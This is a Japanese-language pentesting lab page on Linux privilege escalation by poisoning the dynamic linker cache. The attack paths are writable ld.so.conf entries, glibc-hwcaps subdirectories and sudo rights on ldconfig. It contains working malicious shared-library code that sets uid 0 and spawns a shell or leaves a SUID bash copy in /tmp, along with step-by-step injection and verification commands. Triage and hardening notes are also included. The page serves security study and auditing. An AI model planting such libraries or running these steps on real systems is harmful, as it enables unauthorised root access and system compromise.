# ld.so privesc exploit の例

{{#include ../../banners/hacktricks-training.md}}

このページでは、**`/etc/ld.so.conf` または `ldconfig` を通じた system linker cache の poisoning** に焦点を当てた lab を扱います。missing-library injection、writable `RPATH`/`RUNPATH`、`LD_PRELOAD`、その他の一般的な SUID linker abuse については、[SUID Shared Library and Linker Abuse](suid-shared-library-and-linker-abuse.md) を参照してください。

## 環境の準備

以下のセクションでは、環境の準備に使用するファイルの code を確認できます。

{{#tabs}}
{{#tab name="sharedvuln.c"}}
```c
#include <stdio.h>
#include "libcustom.h"

int main(){
printf("Welcome to my amazing application!\n");
vuln_func();
return 0;
}
```
{{#endtab}}

{{#tab name="libcustom.h"}}
```c
#include <stdio.h>

void vuln_func();
```
{{#endtab}}

{{#tab name="libcustom.c"}}
```c
#include <stdio.h>

void vuln_func()
{
puts("Hi");
}
```
{{#endtab}}
{{#endtabs}}

1. **作成** それらのファイルを同じフォルダ内のマシン上に作成します
2. **コンパイル** **ライブラリ**: `gcc -shared -o libcustom.so -fPIC libcustom.c`
3. `libcustom.so` を `/usr/lib` に**コピー**し、cache を更新します: `sudo cp libcustom.so /usr/lib && sudo ldconfig`（root 権限）
4. **コンパイル** **実行ファイル**: `gcc sharedvuln.c -o sharedvuln -lcustom`

### 環境を確認する

_libcustom.so_ が _/usr/lib_ から**ロード**されており、binary を**実行**できることを確認します。
```
$ ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)

$ ./sharedvuln
Welcome to my amazing application!
Hi
```
### Useful triageコマンド

実際の target を攻撃する際は、binary が必要とする **正確な library name**、loader が**現在 resolve している対象**、および live cache を変更せずに書き込み可能な設定済みパスを確認します。<sup>[[1]](#references)[[2]](#references)</sup>
```bash
# Needed SONAME and program interpreter
readelf -d ./sharedvuln | grep NEEDED
interp=$(readelf -l ./sharedvuln | sed -n 's/.*interpreter: \(.*\)]/\1/p')

# Cached candidates and the path selected by the loader
ldconfig -p | grep -F libcustom
"$interp" --list ./sharedvuln 2>/dev/null
LD_DEBUG=libs ./sharedvuln 2>&1 | grep -E 'find library|trying file'

# Configuration, writable config objects, and every component of a configured path
grep -RnsEv '^[[:space:]]*(#|$)' /etc/ld.so.conf /etc/ld.so.conf.d 2>/dev/null
find /etc/ld.so.conf /etc/ld.so.conf.d -writable -ls 2>/dev/null
namei -l /home/ubuntu/lib

# Enumerate what ldconfig would scan without changing links (-X) or the cache (-N)
/sbin/ldconfig -N -X -v 2>/dev/null
```
`ldd` は **trusted** な実行ファイルに対してのみ使用してください。実装によっては、または通常とは異なる ELF interpreter によっては、attacker-controlled code が実行される可能性があります。`objdump -p ./file | grep NEEDED` を使えば、直接の依存関係を安全に一覧表示できます。trusted target では、見つかった interpreter を `--list` とともに呼び出すと、実際の resolution を確認できます。<sup>[[4]](#references)</sup>

いくつかの有用な注意点:

- `sudo echo ... > /etc/ld.so.conf.d/x.conf` は通常 **機能しません**。これは
現在の shell によって redirection が実行されるためです。代わりに
`echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf` を使用してください。
- **SUID/privileged** binary は **secure-execution mode** では
`LD_LIBRARY_PATH`/`LD_PRELOAD` を無視しますが、`/etc/ld.so.conf` から読み込まれる directory は
trusted loader configuration の一部であり続けるため、この misconfiguration は依然として privileged program に影響を与える可能性があります。<sup>[[1]](#references)</sup>
- `LD_DEBUG` も、`/etc/suid-debug` が存在しない限り secure-execution mode では無視されます。そのため、privileged execution からの出力を期待するのではなく、同等の non-SUID run から trace を取得してください。<sup>[[1]](#references)</sup>
- 新しい glibc version では、dynamic loader は
`--list-diagnostics` も提供します。これは、hijack が期待どおりに動作しない場合に、cache resolution と
`glibc-hwcaps` subdirectory selection を debug するのに便利です。<sup>[[1]](#references)</sup>

### Cache と SONAME の制約

`ldconfig` は configured directory 内の任意の file をすべて cache するわけではありません。ELF header を検査し、`lib*.so*` または `ld-*.so*` に一致する name を認識し、一般的な `libfoo.so -> libfoo.so.1 -> libfoo.so.1.12` chain を想定します。したがって injected object には、target architecture/class、正確な `DT_NEEDED` name（通常はその `DT_SONAME`）、および victim が resolve するすべての symbol/version が必要です。<sup>[[2]](#references)</sup>
```bash
readelf -h /home/ubuntu/lib/libcustom.so | grep -E 'Class:|Machine:'
readelf -d /home/ubuntu/lib/libcustom.so | grep SONAME
readelf -Ws /home/ubuntu/lib/libcustom.so | grep vuln_func
ldconfig -p | grep -F 'libcustom.so'
```
この例のように、対象専用のライブラリを優先してください。不完全なオブジェクトで一般的な SONAME を shadowing すると、意図した privileged target が実行される前にその SONAME を解決するすべてのプロセスが壊れる可能性があります。<sup>[[3]](#references)</sup>

## Exploit

このシナリオでは、_ /etc/ld.so.conf/_ 内のファイルに**脆弱なエントリを作成した人物がいる**と仮定します。
```bash
echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf
```
脆弱なフォルダーは書き込みアクセスが可能な _/home/ubuntu/lib_ です。\
そのパス内で以下のコードを **ダウンロードしてコンパイル** します:
```c
// gcc -shared -fPIC -Wl,-soname,libcustom.so -o libcustom.so libcustom.c

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(void){
setgid(0);
setuid(0);
puts("I'm the bad library");
system("/bin/sh");
}
```
後で **root**（または別の特権アカウント）が脆弱なバイナリを実行すると予想される場合は、通常、インタラクティブシェルを起動するのではなく、**root所有の成果物**を残すほうが適切です。例：
```c
system("cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash");
```
その後、特権実行が行われたら、`/tmp/rootbash -p` を使用できます。

**misconfigured** なパス内に悪意のある libcustom ライブラリを**作成した**ため、デフォルトの cache は、成功する特権付き **`ldconfig`** 実行によって再構築される必要があります。再起動が有効なのは、ローカルの boot process が実際にこれを呼び出す場合だけです。それ以外の場合は、administrator の操作を待つか、利用可能であれば安全でない sudo rule を使用してください。<sup>[[2]](#references)</sup>

これが発生したら、`sharedvuln` executable が `libcustom.so` ライブラリをどこからロードしているかを**再確認**します:
```c
$ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffeee766000)
libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
```
ご覧のとおり、**`/home/ubuntu/lib` からロードしており**、どのユーザーが実行してもシェルが実行されます：
```c
$ ./sharedvuln
Welcome to my amazing application!
I'm the bad library
$ whoami
ubuntu
```
> [!TIP]
> この例ではまだ権限を昇格していない点に注意してください。しかし、実行されるコマンドを変更し、**root またはその他の特権ユーザーが脆弱なバイナリを実行するのを待つ**ことで、権限を昇格できます。

### Modern `glibc-hwcaps` shadowing

glibc 2.33 以降、loader は **すべてのライブラリ検索ディレクトリ**内にある `glibc-hwcaps/<level>/` 以下の最適化されたライブラリを優先できます。そのため、`/home/ubuntu/lib` のみを確認するだけでは不十分です。`/home/ubuntu/lib/glibc-hwcaps/x86-64-v3/` のような書き込み可能な互換性サブディレクトリは、`ldconfig` がインデックスを作成した後にベースライブラリを shadow できます。一方、その他の CPU ではベースオブジェクトが引き続き使用されます。これにより、別の CPU 上で validation を行った場合に見落とされる可能性がある、architecture-selective な hijack も可能になります。<sup>[[1]](#references)[[3]](#references)</sup>
```bash
# The loader prints the supported levels in priority order
"$interp" --help | sed -n '/Subdirectories of glibc-hwcaps/,$p'
find /home/ubuntu/lib/glibc-hwcaps -type d -writable -ls 2>/dev/null

# Example for a host that reports x86-64-v3 as supported
mkdir -p /home/ubuntu/lib/glibc-hwcaps/x86-64-v3
gcc -shared -fPIC -Wl,-soname,libcustom.so \
-o /home/ubuntu/lib/glibc-hwcaps/x86-64-v3/libcustom.so libcustom.c
sudo ldconfig
ldconfig -p | grep -F libcustom.so
"$interp" --list ./sharedvuln | grep -F libcustom.so
```
現在の glibc hardening guidance では、重複した SONAME、デフォルト以外の search location、および `glibc-hwcaps` サブディレクトリ内の object を避けることが推奨されています。audit の観点では、設定されたディレクトリとその親 path components に対して、ownership と writeability のチェックを再帰的に実行してください。<sup>[[3]](#references)</sup>

### その他の misconfigurations - 同じ vuln

前の例では、administrator が **`/etc/ld.so.conf.d/` 内の configuration file に、特権のない folder を設定した** という misconfiguration を偽装しました。\
しかし、同じ vulnerability を引き起こす可能性がある misconfiguration は他にもあります。`/etc/ld.so.conf.d` 内の **config file**、`/etc/ld.so.conf.d` folder、または `/etc/ld.so.conf` file のいずれかに **write permissions** がある場合、同じ vulnerability を設定して exploit できます。

## Exploit 2

**`ldconfig` に対する sudo privileges があるとします**。\
`ldconfig` **に conf files の load 元を指定できる**ため、それを利用して `ldconfig` に任意の folders を load させることができます。<sup>[[2]](#references)</sup>\
それでは、`/tmp` を load するために必要な files と folders を作成しましょう：
```bash
cd /tmp
mkdir -p conf
echo "include /tmp/conf/*" > fake.ld.so.conf
echo "/tmp" > conf/evil.conf
```
では、**previous exploit** で示したとおり、**悪意のあるライブラリを `/tmp` 内に作成**します。\
最後に、パスを読み込み、バイナリがどこからライブラリを読み込んでいるか確認します:
```bash
# -f changes the input configuration; the default output is still /etc/ld.so.cache
sudo ldconfig -f fake.ld.so.conf

ldd sharedvuln
linux-vdso.so.1 =>  (0x00007fffa2dde000)
libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
```
**ご覧のとおり、`ldconfig` に対する sudo 権限があれば、同じ脆弱性を exploit できます。** 制限された sudo ルールを評価する際は、オプションの詳細が重要です。`-f` は別の設定ファイルを選択しますが、それでも `/etc/ld.so.cache` を再構築します。`-C` は cache の出力先を別の場所に変更します。`-N` は cache の再構築を防止します。また、`-X` はリンクの更新を防止しますが、**`-N` と組み合わせない限り、cache は再構築されます**。<sup>[[2]](#references)</sup>



## References

- [1] [ld.so(8) - Linux manual page](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [2] [ldconfig(8) - Linux manual page](https://man7.org/linux/man-pages/man8/ldconfig.8.html)
- [3] [Dynamic Linker Hardening - The GNU C Library](https://sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Hardening.html)
- [4] [ldd(1) - Linux manual page](https://man7.org/linux/man-pages/man1/ldd.1.html)
{{#include ../../banners/hacktricks-training.md}}
